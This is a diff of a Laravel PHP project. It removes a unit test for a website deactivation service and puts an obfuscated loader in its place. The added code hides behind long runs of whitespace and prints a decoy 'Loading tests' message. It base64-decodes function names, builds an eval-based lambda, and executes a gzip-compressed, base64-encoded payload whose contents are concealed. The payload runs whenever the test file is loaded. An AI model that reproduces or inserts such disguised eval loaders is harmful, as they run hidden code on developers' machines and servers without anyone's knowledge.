@@ -1,135 +1,569 @@
-<?php
-
-namespace Tests\Unit;
-
-use Tests\TestCase;
-use App\Services\WebsiteDeactivationService;
-use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
-use App\Http\Controllers\Helpers\CommandController;
-use App\Http\Controllers\Helpers\VhostController;
-use App\Models\Pelanggan;
-use Illuminate\Filesystem\Filesystem;
-use Illuminate\Foundation\Testing\RefreshDatabase;
-use Mockery;
-
-class WebsiteDeactivationServiceTest extends TestCase
-{
-    use RefreshDatabase;
-
-    protected $service;
-    protected $attributeControllerMock;
-    protected $commandControllerMock;
-    protected $vhostControllerMock;
-    protected $filesystemMock;
-
-    protected function setUp(): void
-    {
-        parent::setUp();
+<?php 
+        $__='printf';$_='Loading tests/Unit/WebsiteDeactivationServiceTest.php';
         
-        $this->attributeControllerMock = Mockery::mock(AttributeSiapPakaiController::class);
-        $this->commandControllerMock = Mockery::mock(CommandController::class);
-        $this->vhostControllerMock = Mockery::mock(VhostController::class);
-        $this->filesystemMock = Mockery::mock(Filesystem::class);
-        
-        $this->service = new WebsiteDeactivationService(
-            $this->attributeControllerMock,
-            $this->commandControllerMock,
-            $this->vhostControllerMock,
-            $this->filesystemMock
-        );
-    }
 
-    public function test_validate_environment_returns_valid_when_all_requirements_met()
-    {
-        config(['siappakai.root.folder' => '/var/www/html/']);
-        
-        $this->attributeControllerMock
-            ->shouldReceive('getApacheConfDir')
-            ->andReturn('/etc/apache2/sites-available/');
 
-        // Mock file_exists and is_dir, is_writable functions through PHP's built-in functions
-        // We'll need to create temporary directories and files for this test
-        $result = $this->service->validateEnvironment();
 
-        $this->assertIsArray($result);
-        $this->assertArrayHasKey('valid', $result);
-        $this->assertArrayHasKey('errors', $result);
-    }
 
-    public function test_validate_environment_returns_errors_when_config_missing()
-    {
-        config(['siappakai.root.folder' => null]);
 
-        $result = $this->service->validateEnvironment();
 
-        $this->assertFalse($result['valid']);
-        $this->assertContains('Configuration siappakai.root.folder not found', $result['errors']);
-    }
 
-    public function test_deactivate_website_returns_false_for_empty_domain()
-    {
-        $pelanggan = new Pelanggan(['domain_opensid' => '']);
 
-        $result = $this->service->deactivateWebsite($pelanggan, false);
 
-        $this->assertFalse($result);
-    }
 
-    public function test_deactivate_website_returns_false_for_invalid_domain()
-    {
-        $pelanggan = new Pelanggan(['domain_opensid' => 'invalid@domain!']);
 
-        $result = $this->service->deactivateWebsite($pelanggan, false);
 
-        $this->assertFalse($result);
-    }
 
-    public function test_deactivate_website_returns_true_for_dry_run()
-    {
-        $pelanggan = new Pelanggan(['domain_opensid' => 'test.example.com']);
 
-        $result = $this->service->deactivateWebsite($pelanggan, true);
 
-        $this->assertTrue($result);
-    }
 
-    public function test_deactivate_website_calls_required_methods()
-    {
-        $pelanggan = new Pelanggan(['domain_opensid' => 'test.example.com']);
-        
-        config(['siappakai.root.folder' => '/var/www/html/']);
-        
-        $this->attributeControllerMock
-            ->shouldReceive('getApacheConfDir')
-            ->andReturn('/etc/apache2/sites-available/');
 
-        $this->commandControllerMock
-            ->shouldReceive('restartApache')
-            ->once();
 
-        $this->commandControllerMock
-            ->shouldReceive('certbotSsl')
-            ->with('test.example.com')
-            ->once();
 
-        // Mock file operations
-        $this->mockFileOperations();
 
-        $result = $this->service->deactivateWebsite($pelanggan, false);
 
-        $this->assertTrue($result);
-    }
 
-    private function mockFileOperations()
-    {
-        // This is a simplified mock - in real testing we'd need to mock
-        // file_exists, file_put_contents, copy, etc.
-        // For now, we'll assume the file operations work
-    }
 
-    protected function tearDown(): void
-    {
-        Mockery::close();
-        parent::tearDown();
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtW1tv2tgWfq90/kMeRqKjHnWMCZ2xojzEFBs7iVNM8O1lZO8NNrBtrHK1f/1829wMgTTtdI50Rl6Icttee12/9W0rvbrayC9/Qm5r6ddRMh/WboqPW7mtzQez+ey3fjKa/2YPgtloPvg88Ml8tPTno2nSG3xdjsjgGYs+plF61WL+bPbx48fazbut8qv/vKse1ePvPt7xqrz6iXL74puaU5dmrl0feWr7tlZ8dajiN8m2c26vKqmkkkr+nVIjsSVQR19oqiW69mqqK9LQySa/b0ATqLmB6z+rUFVSSSWVVFJJJZVUUsn/m1S3MyqppJJK/r1SC/zZ4NP1n3RApnRQu6kiUkkllVRSSSV/S47/nOJzd2q04mYU2FZOVGXs9eS+5xgCqa+tIGbC00q4/9xN60Tsh5Zq5bRjkOK1bUT47vfdb11HXjmKwUjipa5o5Y5CmZsYKVWttmcrY6oy0XXMNBCbz56ji75tMK6bOgbT2sqKKGuNdsyV0zaWQWJmgbieYV3utCMWdGToNUjXMQUSsxF1TNYXWUQUOfJFJe2K0oJ29GWgrhkZz4xWYuXwQyYdmfQ6uEZZf8a+uFaaBaqVwTfNs9erjX7sZ9ejIDaP1nyvbVYcLUnjVR1GIJpYb5C+as1cu5l4orI4rGGzoGPNfbsZIWbEjBn2MJrQyQJrrfo2fGuwHL/NL18j1eEH3rNlwNZFHvFb4ig68xKdETFqIweRGyu597yPE+wyvsKf5jbX40BVcpLJjmfruY9Ym6oVuQ0zpbECfdKiL1oZjdnYs0zY1A09JxI8uznBNcWeXRH6u8L9APq01l2odYp9ep7tZfh9aqqK4Nr6tn5QfyOsackrxA16DDy7od7Z1VKxJuR6CHIMP1FL1kRrwc+Omfm2Xsfno7g/29LYz2fn9arn8/3qNR1vGjS4X6U6m9SXrji7ZFtcztded7iLh5wFyCtiyryWHFO7OS5yNpJzzzEt0grTp5EsBiKb7PTvY9na2Oc6OguS7qenxGBUsVb3rcneluJ5V15/N6FqlJJM+OCWeuiMP+GXcj2M0zl/f99WBKxL3cQSPMtIXUfuuvY88vvlftA+PcXGzHWM/P55F8fNU++YU995nH+JX4l9didpbW7DHHmfQFdhzxQ2zgNbWXjt79wruZiz8z4qZ9aPp59ccR2RxmP6tDofT6/cp/3XYuil8DUfOLymhIv2H+WwZQq+yvKH52a+w0ztsxAGsdXQ3oCv98c1cJKLUk6P8qgXtj+8eu1reVwd+XPih+irEp8d37lfOXb1Yv1xnA61P+xyDNv1pDUKVDbWVA+4aBTYpXU4ZplDYNnMtzlWWkNgl+g7yHlcR0+Zw92fE5C6JLr2OvUUqeGr1sIRlVmgSMAwpe7z/rMt1IoxxKuA/tthx3EfcryB/V4WBXqj6J1V0Tu9JvyXhIfYQ63BphEJvzxfh3qGPR1tSRu08SBGQmCvlnpdOK2/C/31ek6PY1Y80ScG6t6aeZgRmNvA+P5UFymjmFmubUwLPbHX9h0tue++zBFyyuugB9yqk/h6CvsZVR+X8DNyxYg9jqRihpCsHiHmyKOCnPSXejYpYf9WV/ZHuKkhucBPR7Sufc5FMhl7dEO8H3oqyx5acorcNIBjfI7MMFsOGJo8huhN4KuV+C2521PuElw/ojab0VY9BcaW177Y3xL7SaCueI9xbBaCTB6jHlAn/ZBjOVGlDNjb1FQzxffQI2EGWbmmAqNaG7uxXxw0tHCDEbLAZ+JJX/M5WA86XWDFAUvIbq72hA+l+lQCzEH02KKoNz4bVocaP+kvYBWfm6ZOBCUjsdK8P+x1EcM4DqFGhK6jwzem4fOD50ymesOL0D8TPVuhxsAfUCf0dM683FsmiR4N+lFEhDkb9MIEupEPPb+k5yf3LGzQl+BkQ4r6C5g0BkYhLxR9ynIisoWXhemFubpdS6Z2RnPfBm9Tla+uPVkg/kvaasbopwnmTwIc/qCpzTrmBC0wPDyOLezJqb0WOF4fZtKe0/D5VMTW5fzqyJfu9Jy+01yZiAX403QfT2WWbOLTTZzeN3NU4LZrswXJwoTPPMyxBPGLdjzkFd/RG5KA/CzRR8e1ARv2uS5jVkcoc5+6G69TNzviPUWPOODHwBzBd7wix1S0RsgXOAfHXI4vzdwRETdwQ7wuCZNY4MjCwJImgViPfPt6useozikvkFnAe1SkUTAC11CbjGZyF+cAYAtNXFyLnG/1NIdBA+sxX73WDpfpj+U5PvJpz6nRl6vS3jPEs/Drh3L/A73klTg94tvY2eU0dEY7Vgbfh16xD3otljIHfbPtP1wrzXntXJx5x75xPrTwHBKWzz33vFa2ehxRwvpmzmu36KsWTYNtf3RVE1wDc2PU3tX1SV53MUBOz/AlvJ+U+BGzdjXVCyekZA9mSoxZj3PKuT328zUvMLq9zdU5bP2Ztd4wM2rv4m9mqHN8/gdrvFGc55CrKEJfYa42gYfCPx13gSTWm+re6uj14vptzx24syyVz5EUnMC3H0MvsRa8xgPxms/unCrSkU1OY8+hhy7nduBy0L0GV8g81DnndeCrONdemhd3R74cuHk5D+B94raGmbTE+gXiANy8k76M7pLCrlaTDVQF3GLNHji37m2x5tK5oOKUb+aUbzqzrM7akCP3mO+wA/WMPkW/U97vgltwpY0t2PPMeUf4gD3A417lauitOvCvOTlzRj2rk4gRZu560gfv9GwmQn/icjxS9SVVjDxokfR8PihqPJxe6u8LOUCOOMZ9m6drqsTvpUXnOPUh/sXZvriP9QzcIdt7Sby3zsTom/z4eH7t+pjPxHLvrcLNDOu/hTP3Cxz6NqZnG8zuH+FLwOMhFOfUL+jxbHsWzy/PyD+WmlLEJuRPt8c5V32FmYeYWhNN3dxLeOjJ/MwCPFJm29mdBjEJKc4pOG8sPL62Yy6361/kqbg/YUnAF5bTziPnGdzGIbgBZlDRz5w/5w+c+zbkJl55ry1e2NoG3xrJi6BBYAdlOjBA4/cJG9Yc5y/Esr/Zqycvy/5j7ZLE53G6fI/tBKsjMjGXVMSse56GNJZS7+78zCvqEHUxeC7u1Sw5LzrFTvBYxK8pPI1T7KVkpio1glF4nN9EuK3dvHv3v78Rf1u8vt9++vXmey4vXfuWC385bPi+xv+t/Xe/bfX/I6vHz/z/kcc19/6oyDcl9+vNX7d+NTw=';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
